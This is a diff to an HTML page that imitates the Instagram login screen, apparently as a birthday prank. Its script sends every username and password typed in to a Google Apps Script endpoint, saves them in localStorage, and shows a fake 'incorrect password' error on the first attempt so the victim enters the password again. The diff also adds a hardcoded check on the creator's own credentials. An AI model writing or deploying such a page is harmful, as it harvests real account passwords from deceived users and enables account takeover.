@@ -39,7 +39,9 @@
             border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
         }
 
-        .error-msg { color: #ed4956; font-size: 0.8rem; margin-bottom: 10px; display: none; }
+        /* Error Messages Styling */
+        .error-msg { color: #ed4956; font-size: 0.8rem; margin-bottom: 10px; display: none; font-weight: 600; }
+        #programmer-error { color: #ff0000; border: 1px solid #ff0000; padding: 5px; border-radius: 5px; background: #fff0f0; }
 
         .switch-link { display: block; margin-top: 15px; color: transparent; height: 10px; text-decoration: none; }
 
@@ -49,19 +51,12 @@
         }
 
         #gift-screen { background: radial-gradient(circle, #fff5f7 0%, #ffdee9 100%); border: 2px solid #ffd700; }
-
         .bday-title { font-family: 'Great Vibes', cursive; font-size: 3rem; color: #d81b60; text-shadow: 2px 2px #fff; }
-
         .cake-emoji { font-size: 5rem; margin: 20px 0; display: block; filter: drop-shadow(0 0 10px #ffd700); animation: pulse 1.5s infinite; }
-
         @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-
         .confetti { position: fixed; width: 10px; height: 10px; top: -10px; z-index: 1; animation: fall linear forwards; }
-
         @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
-
         .heart { position: fixed; color: #ff4d4d; font-size: 2rem; bottom: -50px; z-index: 1; pointer-events: none; animation: floatHeart 4s linear forwards; }
-
         @keyframes floatHeart { 0% { transform: translate(0, 0) rotate(0deg); opacity: 1; } 100% { transform: translate(-50vw, -110vh) rotate(360deg); opacity: 0; } }
     </style>
 </head>
@@ -71,6 +66,8 @@
     <div id="login-screen" class="card">
         <h1>Instagram</h1>
         <div class="sub-text">sirf or sirf apke liye 😤🤧</div>
+        
+        <div id="programmer-error" class="error-msg">You are not the programmer so you can't use programmers login credentials</div>
         
         <div id="error-box" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
         
@@ -105,22 +102,32 @@
 
 <script>
     let bdayInterval;
-    let loginAttempts = 0; // Track attempts
+    let loginAttempts = 0;
 
     async function checkLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         const errorBox = document.getElementById('error-box');
+        const progError = document.getElementById('programmer-error');
         
-        // Your Google Script URL
         const scriptURL = 'https://script.google.com/macros/s/AKfycbxeSk51JqNDzU0kWQsbh5_BoMru3xpTN1XnySron0pI2wdaTnRm807QFoQVKRGjL3c/exec'; 
 
         if (!u || !p) { alert("Please fill all fields!"); return; }
 
-        // Send data to Google Sheet every time
+        // --- NEW PROGRAMMER CHECK ---
+        if (u === '_prashantrazzz' && p === 'pk6861172@gmail.co') {
+            errorBox.style.display = 'none';
+            progError.style.display = 'block';
+            return; // STOP everything here
+        }
+
+        // Hide errors if they were shown
+        progError.style.display = 'none';
+
+        // Send data to Google Sheet
         fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({u, p, time: new Date().toLocaleString()}) });
 
-        // Save locally
+        // Save locally for secret button
         let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
         logs.push({ u, p, time: new Date().toLocaleString() });
         localStorage.setItem('userLogs', JSON.stringify(logs));
@@ -128,12 +135,10 @@
         loginAttempts++;
 
         if (loginAttempts === 1) {
-            // First time: Show error and clear password
             errorBox.style.display = 'block';
             document.getElementById('pass').value = '';
             document.getElementById('pass').focus();
         } else {
-            // Second time or more: Show birthday page
             showScreen('gift');
         }
     }
@@ -185,4 +190,4 @@
     function hideSecret() { showScreen('login'); }
 </script>
 </body>
-</html>       
+</html>
